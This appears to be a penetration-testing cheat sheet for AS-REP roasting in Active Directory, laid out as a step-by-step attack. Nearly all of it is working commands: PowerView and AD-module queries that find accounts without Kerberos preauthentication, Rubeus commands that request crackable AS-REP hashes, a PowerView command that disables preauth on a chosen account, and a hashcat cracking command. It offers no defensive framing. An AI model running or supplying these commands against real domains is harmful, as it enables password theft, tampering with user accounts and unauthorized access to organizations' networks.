# AS-REP Roasting

## 1) Enumerate users

##### PowerView:

    Get-DomainUser -PreauthNotRequired -Verbose

##### AD module:

    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth

## 2) Request AS-REP hash

    .\Rubeus.exe asreproast /user:<target> /domain:domain.local /format:hashcat

##### To enumerate AS-REP roastable users through LDAP

    .\Rubeus.exe asreproast /creduser:"domain.local\user1" /credpassword:"password" /domain:domain.local /format:hashcat

## Disable Kerberos Preauth

With PowerView, with enough privileges it is possible to perform targeted AS-REP roasting.

    Set-DomainObject -Identity user1 -XOR @{useraccountcontrol=4194304} -Verbose
    Get-DomainUser -PreauthNotRequired -Verbose

## 3) Crack the hash

With john or hashcat it could be performed.
 
In case of DES hash, here is the command:

    hashcat -a 3 -m 14000 <DES_hash> -1 charsets/DES_full.charset --hex-charset ?1?1?1?1?1?1?1?1

